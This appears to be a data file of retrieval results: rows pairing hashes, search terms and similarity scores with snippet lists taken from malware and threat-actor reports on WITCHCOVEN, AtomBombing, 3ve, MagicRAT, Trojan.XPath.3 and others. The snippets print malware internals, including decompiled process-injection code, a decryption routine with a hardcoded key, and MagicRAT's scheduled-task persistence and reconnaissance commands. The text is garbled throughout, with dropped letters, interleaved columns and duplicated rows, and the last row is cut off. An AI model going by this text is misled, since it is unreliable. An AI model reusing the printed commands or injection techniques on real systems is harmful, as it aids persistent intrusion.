272d3c74c836029cd04557377079991e,computer name,0.7631110073603482,"['probable targets.', 'becomes part of a unique ""browser fingerprint"" that can identify the users computer moving forward.', '4 SPECIAL REPORT Pinpointing Targets: Exploiting Web Analytics to Ensnare Victims THE OPERATION B egining last year, we identified cyber When an unsuspecting user visits any of the actors integrating fre, publicly available over 10 compromised websites, a smal piece The folowing are tols with custom scripts to monitor the of inserted codembeded in the sites HTML examples of some of the online activities of Internet users without their and invisible to casual visitorsquietly redirects web tols embeded knowledge,2 just as corporations track the online the users browser to a second compromised in the WITCHCOVEN activity of web users around the world.', 'We website without the users knowledge.', 'This code and the data they colect: believe these cyber threat actors are building second website hosts the WITCHCOVEN profiles of potential victims and learning about script,4 which uses profiling techniques to colect the vulnerabilities in users computers.', 'These very technical information on the users computer.', 'same technologies that marketing firms use to As of early November 2015, we identified a track their clients and ensure their websites work total of 14 websites hosting the WITCHCOVEN on diferent types of web browsers can help cyber profiling script.', 'The detect Ofice threat actors beter identify their victims and module from the tailor future infection atempts.', 'Browser Exploitation We believe these cyber threat Framework,5 an open The cyber threat actors start by compromising source penetration actors are building profiles of large numbers of legitimate websites.', 'The testing tol, determines potential victims and learning websites are not randomly chosen targets of the Microsoft Ofice oportunity, but specificaly selected as part of about the vulnerabilities in version on a computer a tactic caled a strategic web compromise.3 The users computers.', 'by testing the browsers atackers then modify the underlying HTML response to various ActiveX objects.']"
272d3c74c836029cd04557377079991e,computer name,0.7631110073603482,"['probable targets.', 'becomes part of a unique ""browser fingerprint"" that can identify the users computer moving forward.', '4 SPECIAL REPORT Pinpointing Targets: Exploiting Web Analytics to Ensnare Victims THE OPERATION B egining last year, we identified cyber When an unsuspecting user visits any of the actors integrating fre, publicly available over 10 compromised websites, a smal piece The folowing are tols with custom scripts to monitor the of inserted codembeded in the sites HTML examples of some of the online activities of Internet users without their and invisible to casual visitorsquietly redirects web tols embeded knowledge,2 just as corporations track the online the users browser to a second compromised in the WITCHCOVEN activity of web users around the world.', 'We website without the users knowledge.', 'This code and the data they colect: believe these cyber threat actors are building second website hosts the WITCHCOVEN profiles of potential victims and learning about script,4 which uses profiling techniques to colect the vulnerabilities in users computers.', 'These very technical information on the users computer.', 'same technologies that marketing firms use to As of early November 2015, we identified a track their clients and ensure their websites work total of 14 websites hosting the WITCHCOVEN on diferent types of web browsers can help cyber profiling script.', 'The detect Ofice threat actors beter identify their victims and module from the tailor future infection atempts.', 'Browser Exploitation We believe these cyber threat Framework,5 an open The cyber threat actors start by compromising source penetration actors are building profiles of large numbers of legitimate websites.', 'The testing tol, determines potential victims and learning websites are not randomly chosen targets of the Microsoft Ofice oportunity, but specificaly selected as part of about the vulnerabilities in version on a computer a tactic caled a strategic web compromise.3 The users computers.', 'by testing the browsers atackers then modify the underlying HTML response to various ActiveX objects.']"
c89a6cfa1e6eb16768ede2ce52695f89,computer name,0.7631110073603482,"['versions of the RAT including the ability to start a 204 52 Unknown.', 'comand shel, control proceses and services, 256 32 Nulterminated computername(if upload/download files, terminate TCP conections, sucesfulyobtainedfromthesystem).', 'createuseracounts, retrievesystem information, log 28 12 Procesname.', 'useractivity(viakeyloger), modifytimestamps on 30 52 0x0 bytes inalobserved files, conduct proces injection, conduct denial of comunications.', 'service atacks and shutdown or restart the 352 36 SYSTEM_INFO16structure(format showninAnexB).', 'computer.', 'Comands suported by the XShel softwarearelisted inAnexC.', '(XTiger) 38 72 0x0 bytes inalobserved samples.', '460 12 Unknown.', '472 4 Localeidentifier17.', '18Theproces svchost.exe isagenerichostprocesforservices 476 4 Tick count(repeated).']"
c53da9ec05d78bde1eab4d813ea4924f, NtQueueAPCThread function,0.7633045535294687,"['GetTickCount = GetProcAdres(&pKernel32Module, pKernel32Module.GetTickCount); 28. if ( GetTickCount() - uTicks < 10 ) 29. return 1; 30.', '31.', '/ Get unhoked APIs 32. pUnhokedAPIs = InitializeKernel32ExportList(&UnhokedAPIs); 3.', '34.', '/ Check if DL was executed by Note.exe or rundl32.exe 35. szSystem32Path = DecryptString(szencSystem32Path); 36. if ( !CheckFileName(&pKernel32Module, *szSystem32Path) ) 37. return 1; 38.', '39.', '/ Stard main routine 40.', 'CreateThread = GetProcAdres(&pKernel32Module, szCreateThread); 41. hThread = CreateThread(0, 0, InjectThead, 0, 0, &v57); 42.', '43.', '/ Wait for new theread to finish execution 4.', 'WaitForSingleObject = GetProcAdres(&pKernel32Module, szWaitForSingleObject); 45.']"
5c740b6e771907b0b1c978f66eff5885, NtQueueAPCThread function,0.89938205981921,"['How many parameters does it expect?', '3.', 'Can we do this?', 'Yes.', 'How?', 'NtQueueApcThread!', 'Se main_ApcWriteProcesMemory (htps:/github.com/BreakingMalwareResearch/atom- bombing/blob/f5a04e3fd6eda14e1a7e6429d7e9ec864ec7d4/AtomBombing/main.cp#L82) in AtomBombings GitHub repository (htps:/github.com/BreakingMalwareResearch/atom-bombing).', 'AtomBombing Stage 2: Execution Obviously I could never hope to consistently find RWX code caves in my target proceses.', 'I neded a way to consistently alocate RWX memory in the target proces without caling VirtualAlocEx within the context of the injecting proces.', 'Sadly, I could not find any such function that I could invoke via APC and would alow me to alocate executable memory or change the protection flags of already alocated memory.', 'What do we have so far?']"
5c740b6e771907b0b1c978f66eff5885, NtQueueAPCThread function,0.89938205981921,"['How many parameters does it expect?', '3.', 'Can we do this?', 'Yes.', 'How?', 'NtQueueApcThread!', 'Se main_ApcWriteProcesMemory (htps:/github.com/BreakingMalwareResearch/atom- bombing/blob/f5a04e3fd6eda14e1a7e6429d7e9ec864ec7d4/AtomBombing/main.cp#L82) in AtomBombings GitHub repository (htps:/github.com/BreakingMalwareResearch/atom-bombing).', 'AtomBombing Stage 2: Execution Obviously I could never hope to consistently find RWX code caves in my target proceses.', 'I neded a way to consistently alocate RWX memory in the target proces without caling VirtualAlocEx within the context of the injecting proces.', 'Sadly, I could not find any such function that I could invoke via APC and would alow me to alocate executable memory or change the protection flags of already alocated memory.', 'What do we have so far?']"
fe98d1967014108f1d3110e534975984,encrypted with RC4,0.7769197011557628,"['with an exterior routing protocol.', 'If one of these stolen IP adreses was detected as the source of fraudulent Al this information would be apended to a big string, which activity, it was easily burned and recycled, while the same was RSA-encrypted (with a hard-coded key) and sent to the bots continued runing in the data centers behind it.', 'The server.', 'To be clear, the first mesage included both the user operations ability to continuously find new IPs through info and the RC4 key, and was encrypted with an RSA public which to proxy gave it a layer of protection and isolation, key.', 'If the C2 confirmed that it was safe to start executing avoiding any single point of failure that could alow us comands, the folowing mesages would be quickly to easily eradicate it.', 'encrypted with RC4 using the previously generated RC4 key.', 'The ad fraud bot operation was comprised of Miuref/Boaxe infected-computers.', 'This bot farm largely relied on Chrome and Internet Explorer.', 'While the number of IPs hijacked from corporations ranged from 20,0 to 50,0 at any given time, the malware infection fotprint apears to have remained at les than 5,0 infections acros the globe.', 'The Hunt for 3ve 17 pn:C:\\Test\\eve.exe un:davidcoperfield cn:DESKTOP-1Z8V3O1 cpu:1,1,Intel(R) Core(TM) i7-60U CPU @ 2.60GHz sk: uwomanrx (RC4 Key used for future comunication) Mesage sent and encrypted for 3ve.1 to start executing comands.', 'After encryption Before encryption and encoding FRO - FRO - ]8 NEp93E3ShqSVbIkH u:x64a7 %2bgCQtnG8K48bJw 2054c8c28ef93 K0gQTlgf2Gm6VuqN bo:6.2.920b: 5OEk4MqJ5LFuxks 64a:0c:1v:10 6mirocIQphD98Vp s:0r:1:20 WHu8HW1C53yM2O1O d:12n:5cp:10c oRmwt36Gi7hqZe3Y r:f0546e28bt:1d FbIvuXJWorsWoyF% 25ec.f1c7fa10p 2fuUus7DcnJNasY1 n:C:\\Test\\eve.ex Skv8BnBufphvW1cO eun:mXacocn OKv8mWdVLGY6Q0z7 :DESKTOP-1X01 3fhWzi4rKyJIdxd cpu:1,1,Intel(R dakdAhiWU%2bvEmj ) Core (TM) i7-6 eryzYLVOLiJA03%2 0U CPU @2.60GH fkJGN51GvBDTrn04 z MYnpx4rxLpXkw9nb 3ve.1 mesages before and after encryption and encoding.']"
fe98d1967014108f1d3110e534975984,encrypted with RC4,0.7769197011557628,"['with an exterior routing protocol.', 'If one of these stolen IP adreses was detected as the source of fraudulent Al this information would be apended to a big string, which activity, it was easily burned and recycled, while the same was RSA-encrypted (with a hard-coded key) and sent to the bots continued runing in the data centers behind it.', 'The server.', 'To be clear, the first mesage included both the user operations ability to continuously find new IPs through info and the RC4 key, and was encrypted with an RSA public which to proxy gave it a layer of protection and isolation, key.', 'If the C2 confirmed that it was safe to start executing avoiding any single point of failure that could alow us comands, the folowing mesages would be quickly to easily eradicate it.', 'encrypted with RC4 using the previously generated RC4 key.', 'The ad fraud bot operation was comprised of Miuref/Boaxe infected-computers.', 'This bot farm largely relied on Chrome and Internet Explorer.', 'While the number of IPs hijacked from corporations ranged from 20,0 to 50,0 at any given time, the malware infection fotprint apears to have remained at les than 5,0 infections acros the globe.', 'The Hunt for 3ve 17 pn:C:\\Test\\eve.exe un:davidcoperfield cn:DESKTOP-1Z8V3O1 cpu:1,1,Intel(R) Core(TM) i7-60U CPU @ 2.60GHz sk: uwomanrx (RC4 Key used for future comunication) Mesage sent and encrypted for 3ve.1 to start executing comands.', 'After encryption Before encryption and encoding FRO - FRO - ]8 NEp93E3ShqSVbIkH u:x64a7 %2bgCQtnG8K48bJw 2054c8c28ef93 K0gQTlgf2Gm6VuqN bo:6.2.920b: 5OEk4MqJ5LFuxks 64a:0c:1v:10 6mirocIQphD98Vp s:0r:1:20 WHu8HW1C53yM2O1O d:12n:5cp:10c oRmwt36Gi7hqZe3Y r:f0546e28bt:1d FbIvuXJWorsWoyF% 25ec.f1c7fa10p 2fuUus7DcnJNasY1 n:C:\\Test\\eve.ex Skv8BnBufphvW1cO eun:mXacocn OKv8mWdVLGY6Q0z7 :DESKTOP-1X01 3fhWzi4rKyJIdxd cpu:1,1,Intel(R dakdAhiWU%2bvEmj ) Core (TM) i7-6 eryzYLVOLiJA03%2 0U CPU @2.60GH fkJGN51GvBDTrn04 z MYnpx4rxLpXkw9nb 3ve.1 mesages before and after encryption and encoding.']"
4c5ec18051ab921ccfde501dd6922238,encrypted with RC4,0.781236989366421,"['That configuration is decrypted with a simple XOR operation: def simplecrypt(x): return xor(x, b""\\xad"" + x[:-1]) Next, the sample finds the explorer.exe proces and uses it to change the token of the curent thread.', 'It then writes logs to a temporary file (%TEMP%/TS_FB56.tmp), but only if the file already exists.', 'These logs are encrypted and the encryption algorithm used is AES256-CBC with 8192 rounds of SHA256: def decrypt(datasample): key = b\'\\x53\\x12\\x76\\x23\\x94\\x89\\x78\\x45\\x58\\x31\\x62\\x83\\x7\\x95\\x59\\x17\\x31\\x47\\x73\\x50\\x2\\x34\\x65\\x89\\x49\\x12\\x67\\x41\\x90\\x35 2/5 realkey = datasample[:0x10]+ b\'\\x0\' * 0x10 for i in range(0x20): realkey = hashlib.sha256(realkey + key).digest() raw = aes.cbc.decrypt(realkey, datasample[:16], datasample[16:]) print(""checksum"", raw[-32:].hex() return raw[:-32] The encryption key is hardcoded, and was previously used in an older sample of this malware.', 'The same encryption algorithm is used for network comunication.', 'The encrypted data structure is as folows: struct encrypted_data { byte[16] IV; byte[N] mesage_data; / always divisible by 16, pading aded as necesary byte[32] sha256_checksum; } The sample stores configuration and state in the folowing file: %apdata%/microsoft/protect/windows/DMI%X.DAT (where %X is variable and depends on the parameter with which sample was started).', 'It is also encrypted, but with RC4.', 'This key was hardcoded in older versions of Sagerunex, but recent samples started to read the key from configuration instead.', 'The config file modification date wil always be in the year 201 the file last edit year is changed by the malware to 201.', 'Network comunication In normal mode, the sample wil try al the folowing suported conection modes in this order.', 'In al cases, HTPS is used, with user agent equal to: Mozila/5.0 (compatible; MSIE 7.0; Win32).', '- 1: htpsviaconfigproxy: HTPS with configured proxy - 2: htpswpadproxy: instead of using configured proxy, use proxy provided by WPAD mechanism (web proxy autodiscovery) - 3: htpsviaiexproxy: self-explanatory.']"
4168c310be3b363c336dfce8526f3a69,encrypted with RC4,0.7700434402397447,"['RenF Rename file in the system.', 'Comunication with C2 over SL In CheckPoints report from 2015, they identify two comunications methods: Comunication over HTP (Port 80) to a dynamic C&C server update server, and comunication with a static update server.', 'Moreover, the identified using of RAW TCP for comunication with the C&C server.', 'The URL and IP adreses were hard-coded stings in the explosive file.', 'In our analysis, we found a new method comunication over HTPS (Port 43).', 'The data is encrypted with RC4 method.', 'Similar to the original methods, the RC4 decryption key is a hard-coded string as wel.', 'Further information about the malware can be found in the CheckPoints technical report.', '_ w.clearskysec.com Al rights reserved to ClearSky Cyber Security ltd. 2021 TLP: WHITE 21 | P age Atribution Lebanese Cedar APT is a stealth threat actor, which is active for more than 8 years.', 'In this report, we uncover the updated malicious activity of this threat actor in Israel and other countries world-wide.', 'As presented in the map on the executive sumary, Lebanese Cedar operates under the radar for more than 5 years, since the last report that covered their operation.']"
3e1d6d711ef78b25b4cba7bbfcd7bcc0,encrypted with RC4,0.7956037704035666,"['However, its interesting that the BE2 developers created wiper code diferent from the Destover and Shamon wiper malware we saw in the Saudi Aramco and SPE atacks.', 'Instead of re-using the comercial EldoS RawDisk drivers in their malware, the BE2 developers wrote their own low-level disk and file destruction routines.', 'Its also a much more chiling deployment of wipers instead of a porly defended media studio, it was delivered to ICS environments.', 'In order to overwrite stored data on al Windows versions, the dstr plugin suports both user-mode and kernel-mode wiper functionality, which is somewhat surprising.', 'The component maintains both an embeded win32 library and win64 driver modules for its kernel mode functionality.', 'They are rc4 encrypted.', 'User-mode functionality The plugin identifies device ids for the systems HD and creates a handle to the systems physical drive, with GENERIC_READ or GENERIC_WRITE aces.', 'Several cals to DeviceIoControl colects data on the physical location of the volume, and the size and properties of this disk.', 'It uses DeviceIoControl with the IOCTL_DISK_GET_DRIVE_GEOMETRY control code in order to retrieve Bytes Per Sector value.', 'dstr then wipes out al open handles to the disk by dismounting it with the FSCTL_DISMOUNT_VOLUME control code.', 'This routine prepares the system for overwrite and ensures no conflicts for plugin file I/O.']"
08a0ccc49008dbbf532b22d39ac2b886,"search, delete files.",0.788267190587084,"['Upon execution, MagicRAT achieves persistence for itself by executing a hardcoded comand that creates scheduled tasks on the victim machine.', 'Comand Intent schtasks /create /tn ""OneDrive AutoRemove"" /tr Scheduled task starting at ""C:\\Windows\\System32\\cmd.exe /c del /f /q a specific time C:/TEMP/[MagicRAT_file_name].exe"" /sc daily /st 10:30:30 /ru [T1053/05] SYSTEM Scheduled task starting at schtasks /create /tn ""Microsoft\\Windows\\light Service Manager"" /tr a diferent time an path C:/TEMP/[MagicRAT_file_name].exe /sc onstart /ru SYSTEM [T1053/05] %HOME%/ApData/Roaming/Microsoft/Windows/Start Link created on startup Menu/Programs/Startup/OneNote.lnk folder [T1547/01] Upon achieving persistence, the RAT contacts the C2.', '4/12 During the initial stages of execution, MagicRAT wil perform just enough system reconaisance to identify the system and environment in which the atackers are operating.', 'This is done by executing the comands whoami, systeminfo and ipconfig /al.', 'The last comand has its results returned via the upload of the file zero_dump.mix to the C2.', ""MagicRAT is rather simple it provides the operator with a remote shel on the victim's system for arbitrary comand execution, along with the ability to rename, move and delete files on the endpoint."", 'The operator can determine the timing for the implant to slep, change the C2 URLs and delete the implant from the infected system.', 'We also discovered a new variant of MagicRAT in the wild generated in April 202.', 'This sample now consisted of the ability to delete itself from the infected endpoint using a BAT file.', 'Aditional malware One of the C2 servers used by the new MagicRAT sample, 64[.]18[.]27[.', ']73, hosted two more distinct implants masquerading as GIF URLs.']"
d83de60fdf0fddec0f19e2da35a36724,file listings,0.8052098370951607,"['Figure 13: A screnshot exfiltrated from victims Windows device on adobeair[.', ']net Skype Logs Databases - The data included the entire Skype ApData folder for certain victims, including mesaging databases.', 'Photos - This data included complete contents of the Pictures folder from compromised Windows machines.', 'It is comon to se smartphone photos backed up to this location, which most often contains personal photographs of family and friends taken by the individual being targeted.', '15 SECURITY RESEARCH REPORT iPhone Backups - This data included an entire unencrypted backup of a victims iPhone.', 'File Listings - This data included al default Windows folders and file listings.', 'Corporate and Legal Documentation - This data included a large colection of company-specific documents.', 'Specificaly, we discovered these on another live comand and control server, planethdx[.]com.', 'Figure 14: An example of corporate documentation, which details the adreses and telephone numbers of customers for a shiping company 16 SECURITY RESEARCH REPORT Paterns of Atacks Dark Caracal folows the typical atack chain for client-side cyber-espionage.', 'Mobile tols include a custom writen Android surveilanceware implant Lokout named Palas9 and a previously unknown FinFisher sample.', 'The groups desktop tols include the Bandok malware family and a newly discovered desktop surveilanceware tol that we have named CrosRAT, which is able to infect Windows, Linux, and OS X operating systems.']"
d83de60fdf0fddec0f19e2da35a36724,file listings,0.8052098370951607,"['Figure 13: A screnshot exfiltrated from victims Windows device on adobeair[.', ']net Skype Logs Databases - The data included the entire Skype ApData folder for certain victims, including mesaging databases.', 'Photos - This data included complete contents of the Pictures folder from compromised Windows machines.', 'It is comon to se smartphone photos backed up to this location, which most often contains personal photographs of family and friends taken by the individual being targeted.', '15 SECURITY RESEARCH REPORT iPhone Backups - This data included an entire unencrypted backup of a victims iPhone.', 'File Listings - This data included al default Windows folders and file listings.', 'Corporate and Legal Documentation - This data included a large colection of company-specific documents.', 'Specificaly, we discovered these on another live comand and control server, planethdx[.]com.', 'Figure 14: An example of corporate documentation, which details the adreses and telephone numbers of customers for a shiping company 16 SECURITY RESEARCH REPORT Paterns of Atacks Dark Caracal folows the typical atack chain for client-side cyber-espionage.', 'Mobile tols include a custom writen Android surveilanceware implant Lokout named Palas9 and a previously unknown FinFisher sample.', 'The groups desktop tols include the Bandok malware family and a newly discovered desktop surveilanceware tol that we have named CrosRAT, which is able to infect Windows, Linux, and OS X operating systems.']"
cae33c8970a53857dff6608fe8894b8a,scheduled task properties,0.7608976354958814,"['Copyright Leonardo S.p.a. Al rights reserved 2 Company General Use MALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 6.', 'MITRE AT&CK TPs T1059 Comand-Line Comand-line interfaces provide a way of interacting with computer Interface systems and is a comon feature acros many types of operating system platforms.', 'One example comand-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software.', 'Comand-line interfaces can be interacted with localy or remotely via a remote desktop aplication, reverse shel sesion, etc.', 'Comands that are executed run with the curent permision level of the comand-line interface proces unles the comand includes proces invocation that changes permisions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a wel-established method used by both defenders and adversaries to hide open ports from aces.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port wil be opened.', 'Usualy this series of packets consists of atempted conections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.', 'After the sequence is completed, opening a port is often acomplished by the host based firewal, but could also be implemented by custom software.', 'T105 Remote File Files may be copied from one system to another to stage adversary Copy tols or other files over the course of an operation.']"
a319633797d551afbfaaced413a54497,unpacks it with aPLib.,0.786404067239126,"['For the operating systems below Windows Vista, Trojan.XPath.3 receives function exports from the themeui.dl: DlCanUnloadNow DlGetClasObject DlInstal DlRegisterServer DlUnregisterServer For the operating systems starting from Windows Vista and higher, it receives function exports from the ExplorerFrame.dl: DlCanUnloadNow DlGetClasObject DlGetVersion 0x6E 0x6F 0x86 The trojan requires these function adreses in order to cal the coresponding functions whenever a trojan library export of the same name is caled.', 'Using the Global\\RunThreadOfWinDK8O98 mutex, Trojan.XPath.3 verifies only one instance of it is runing.', 'Using ZwQuerySystemInformation, the trojan counts the number of proceses runing in the system.', 'It waits until their number exceds 7, then starts the %WINDIR%\\system32\\ \\svchost.exe proces with the CREATE_SUSPENDED flag.', 'Trojan.XPath.3 reads the DirectShow parameter from the registry thread [HKLM\\ \\SOFTWARE\\Microsoft\\LoginInfo] or [HKCU\\SOFTWARE\\Microsoft\\ \\LoginInfo] where the payload is stored.', 'It then unpacks the payload using the APLib library.', '20 20 Next, the trojan alocates a memory block of 0xC80F0 bytes.', 'At the begining of the block it forms the folowing structure: #pragma pack(push,1) struct mod { char char0[128]; _QWORD LdrLoadDl; _QWORD LdrGetProcedureAdres; _QWORD ZwProtectVirtualMemory; _QWORD ZwCreateSection; _QWORD ZwMapViewOfSection; _QWORD qwordA8; _QWORD NtTerminateThread; _QWORD qwordB8; _QWORD qwordc0; _QWORD is_x64; _QWORD payload_size; _QWORD qword8; _BYTE payload[payload_size]; }; #pragma pack(pop) Herewith, in the analyzed sample the char0 value represents a asdsad123 constant.', 'The trojan alocates a memory block of the size of 0xD80F0 bytes to the previously launched svchost.exe proces and copies the entire region of 0xC80F0 bytes onto it.', 'Next, Trojan.XPath.3 searches for the 0x1234568 constant, which is located in the shelcode built into it and replaces it with the memory block adres, previously alocated in the svchost.exe proces.', 'It then copies this shelcode onto the alocated block using the 0xC90F0 ofset.']"
a319633797d551afbfaaced413a54497,unpacks it with aPLib.,0.786404067239126,"['For the operating systems below Windows Vista, Trojan.XPath.3 receives function exports from the themeui.dl: DlCanUnloadNow DlGetClasObject DlInstal DlRegisterServer DlUnregisterServer For the operating systems starting from Windows Vista and higher, it receives function exports from the ExplorerFrame.dl: DlCanUnloadNow DlGetClasObject DlGetVersion 0x6E 0x6F 0x86 The trojan requires these function adreses in order to cal the coresponding functions whenever a trojan library export of the same name is caled.', 'Using the Global\\RunThreadOfWinDK8O98 mutex, Trojan.XPath.3 verifies only one instance of it is runing.', 'Using ZwQuerySystemInformation, the trojan counts the number of proceses runing in the system.', 'It waits until their number exceds 7, then starts the %WINDIR%\\system32\\ \\svchost.exe proces with the CREATE_SUSPENDED flag.', 'Trojan.XPath.3 reads the DirectShow parameter from the registry thread [HKLM\\ \\SOFTWARE\\Microsoft\\LoginInfo] or [HKCU\\SOFTWARE\\Microsoft\\ \\LoginInfo] where the payload is stored.', 'It then unpacks the payload using the APLib library.', '20 20 Next, the trojan alocates a memory block of 0xC80F0 bytes.', 'At the begining of the block it forms the folowing structure: #pragma pack(push,1) struct mod { char char0[128]; _QWORD LdrLoadDl; _QWORD LdrGetProcedureAdres; _QWORD ZwProtectVirtualMemory; _QWORD ZwCreateSection; _QWORD ZwMapViewOfSection; _QWORD qwordA8; _QWORD NtTerminateThread; _QWORD qwordB8; _QWORD qwordc0; _QWORD is_x64; _QWORD payload_size; _QWORD qword8; _BYTE payload[payload_size]; }; #pragma pack(pop) Herewith, in the analyzed sample the char0 value represents a asdsad123 constant.', 'The trojan alocates a memory block of the size of 0xD80F0 bytes to the previously launched svchost.exe proces and copies the entire region of 0xC80F0 bytes onto it.', 'Next, Trojan.XPath.3 searches for the 0x1234568 constant, which is located in the shelcode built into it and replaces it with the memory block adres, previously alocated in the svchost.exe proces.', 'It then copies this shelcode onto the alocated block using the 0xC90F0 ofset.']"
a319633797d551afbfaaced413a54497,unpacks with aPLib,0.7647583742838049,"['For the operating systems below Windows Vista, Trojan.XPath.3 receives function exports from the themeui.dl: DlCanUnloadNow DlGetClasObject DlInstal DlRegisterServer DlUnregisterServer For the operating systems starting from Windows Vista and higher, it receives function exports from the ExplorerFrame.dl: DlCanUnloadNow DlGetClasObject DlGetVersion 0x6E 0x6F 0x86 The trojan requires these function adreses in order to cal the coresponding functions whenever a trojan library export of the same name is caled.', 'Using the Global\\RunThreadOfWinDK8O98 mutex, Trojan.XPath.3 verifies only one instance of it is runing.', 'Using ZwQuerySystemInformation, the trojan counts the number of proceses runing in the system.', 'It waits until their number exceds 7, then starts the %WINDIR%\\system32\\ \\svchost.exe proces with the CREATE_SUSPENDED flag.', 'Trojan.XPath.3 reads the DirectShow parameter from the registry thread [HKLM\\ \\SOFTWARE\\Microsoft\\LoginInfo] or [HKCU\\SOFTWARE\\Microsoft\\ \\LoginInfo] where the payload is stored.', 'It then unpacks the payload using the APLib library.', '20 20 Next, the trojan alocates a memory block of 0xC80F0 bytes.', 'At the begining of the block it forms the folowing structure: #pragma pack(push,1) struct mod { char char0[128]; _QWORD LdrLoadDl; _QWORD LdrGetProcedureAdres; _QWORD ZwProtectVirtualMemory; _QWORD ZwCreateSection; _QWORD ZwMapViewOfSection; _QWORD qwordA8; _QWORD NtTerminateThread; _QWORD qwordB8; _QWORD qwordc0; _QWORD is_x64; _QWORD payload_size; _QWORD qword8; _BYTE payload[payload_size]; }; #pragma pack(pop) Herewith, in the analyzed sample the char0 value represents a asdsad123 constant.', 'The trojan alocates a memory block of the size of 0xD80F0 bytes to the previously launched svchost.exe proces and copies the entire region of 0xC80F0 bytes onto it.', 'Next, Trojan.XPath.3 searches for the 0x1234568 constant, which is located in the shelcode built into it and replaces it with the memory block adres, previously alocated in the svchost.exe proces.', 'It then copies this shelcode onto the alocated block using the 0xC90F0 ofset.']"
a319633797d551afbfaaced413a54497,unpacks with aPLib,0.7647583742838049,"['For the operating systems below Windows Vista, Trojan.XPath.3 receives function exports from the themeui.dl: DlCanUnloadNow DlGetClasObject DlInstal DlRegisterServer DlUnregisterServer For the operating systems starting from Windows Vista and higher, it receives function exports from the ExplorerFrame.dl: DlCanUnloadNow DlGetClasObject DlGetVersion 0x6E 0x6F 0x86 The trojan requires these function adreses in order to cal the coresponding functions whenever a trojan library export of the same name is caled.', 'Using the Global\\RunThreadOfWinDK8O98 mutex, Trojan.XPath.3 verifies only one instance of it is runing.', 'Using ZwQuerySystemInformation, the trojan counts the number of proceses runing in the system.', 'It waits until their number exceds 7, then starts the %WINDIR%\\system32\\ \\svchost.exe proces with the CREATE_SUSPENDED flag.', 'Trojan.XPath.3 reads the DirectShow parameter from the registry thread [HKLM\\ \\SOFTWARE\\Microsoft\\LoginInfo] or [HKCU\\SOFTWARE\\Microsoft\\ \\LoginInfo] where the payload is stored.', 'It then unpacks the payload using the APLib library.', '20 20 Next, the trojan alocates a memory block of 0xC80F0 bytes.', 'At the begining of the block it forms the folowing structure: #pragma pack(push,1) struct mod { char char0[128]; _QWORD LdrLoadDl; _QWORD LdrGetProcedureAdres; _QWORD ZwProtectVirtualMemory; _QWORD ZwCreateSection; _QWORD ZwMapViewOfSection; _QWORD qwordA8; _QWORD NtTerminateThread; _QWORD qwordB8; _QWORD qwordc0; _QWORD is_x64; _QWORD payload_size; _QWORD qword8; _BYTE payload[payload_size]; }; #pragma pack(pop) Herewith, in the analyzed sample the char0 value represents a asdsad123 constant.', 'The trojan alocates a memory block of the size of 0xD80F0 bytes to the previously launched svchost.exe proces and copies the entire region of 0xC80F0 bytes onto it.', 'Next, Trojan.XPath.3 searches for the 0x1234568 constant, which is located in the shelcode built into it and replaces it with the memory block adres, previously alocated in the svchost.exe proces.', 'It then copies this shelcode onto the alocated block using the 0xC90F0 ofset.']"
a319633797d551afbfaaced413a54497,unpacks it with aPLib,0.786404067239126,"['For the operating systems below Windows Vista, Trojan.XPath.3 receives function exports from the themeui.dl: DlCanUnloadNow DlGetClasObject DlInstal DlRegisterServer DlUnregisterServer For the operating systems starting from Windows Vista and higher, it receives function exports from the ExplorerFrame.dl: DlCanUnloadNow DlGetClasObject DlGetVersion 0x6E 0x6F 0x86 The trojan requires these function adreses in order to cal the coresponding functions whenever a trojan library export of the same name is caled.', 'Using the Global\\RunThreadOfWinDK8O98 mutex, Trojan.XPath.3 verifies only one instance of it is runing.', 'Using ZwQuerySystemInformation, the trojan counts the number of proceses runing in the system.', 'It waits until their number exceds 7, then starts the %WINDIR%\\system32\\ \\svchost.exe proces with the CREATE_SUSPENDED flag.', 'Trojan.XPath.3 reads the DirectShow parameter from the registry thread [HKLM\\ \\SOFTWARE\\Microsoft\\LoginInfo] or [HKCU\\SOFTWARE\\Microsoft\\ \\LoginInfo] where the payload is stored.', 'It then unpacks the payload using the APLib library.', '20 20 Next, the trojan alocates a memory block of 0xC80F0 bytes.', 'At the begining of the block it forms the folowing structure: #pragma pack(push,1) struct mod { char char0[128]; _QWORD LdrLoadDl; _QWORD LdrGetProcedureAdres; _QWORD ZwProtectVirtualMemory; _QWORD ZwCreateSection; _QWORD ZwMapViewOfSection; _QWORD qwordA8; _QWORD NtTerminateThread; _QWORD qwordB8; _QWORD qwordc0; _QWORD is_x64; _QWORD payload_size; _QWORD qword8; _BYTE payload[payload_size]; }; #pragma pack(pop) Herewith, in the analyzed sample the char0 value represents a asdsad123 constant.', 'The trojan alocates a memory block of the size of 0xD80F0 bytes to the previously launched svchost.exe proces and copies the entire region of 0xC80F0 bytes onto it.', 'Next, Trojan.XPath.3 searches for the 0x1234568 constant, which is located in the shelcode built into it and replaces it with the memory block adres, previously alocated in the svchost.exe proces.', 'It then copies this shelcode onto the alocated block using the 0xC90F0 ofset.']"
a319633797d551afbfaaced413a54497,unpacks it with aPLib,0.786404067239126,"['For the operating systems below Windows Vista, Trojan.XPath.3 receives function exports from the themeui.dl: DlCanUnloadNow DlGetClasObject DlInstal DlRegisterServer DlUnregisterServer For the operating systems starting from Windows Vista and higher, it receives function exports from the ExplorerFrame.dl: DlCanUnloadNow DlGetClasObject DlGetVersion 0x6E 0x6F 0x86 The trojan requires these function adreses in order to cal the coresponding functions whenever a trojan library export of the same name is caled.', 'Using the Global\\RunThreadOfWinDK8O98 mutex, Trojan.XPath.3 verifies only one instance of it is runing.', 'Using ZwQuerySystemInformation, the trojan counts the number of proceses runing in the system.', 'It waits until their number exceds 7, then starts the %WINDIR%\\system32\\ \\svchost.exe proces with the CREATE_SUSPENDED flag.', 'Trojan.XPath.3 reads the DirectShow parameter from the registry thread [HKLM\\ \\SOFTWARE\\Microsoft\\LoginInfo] or [HKCU\\SOFTWARE\\Microsoft\\ \\LoginInfo] where the payload is stored.', 'It then unpacks the payload using the APLib library.', '20 20 Next, the trojan alocates a memory block of 0xC80F0 bytes.', 'At the begining of the block it forms the folowing structure: #pragma pack(push,1) struct mod { char char0[128]; _QWORD LdrLoadDl; _QWORD LdrGetProcedureAdres; _QWORD ZwProtectVirtualMemory; _QWORD ZwCreateSection; _QWORD 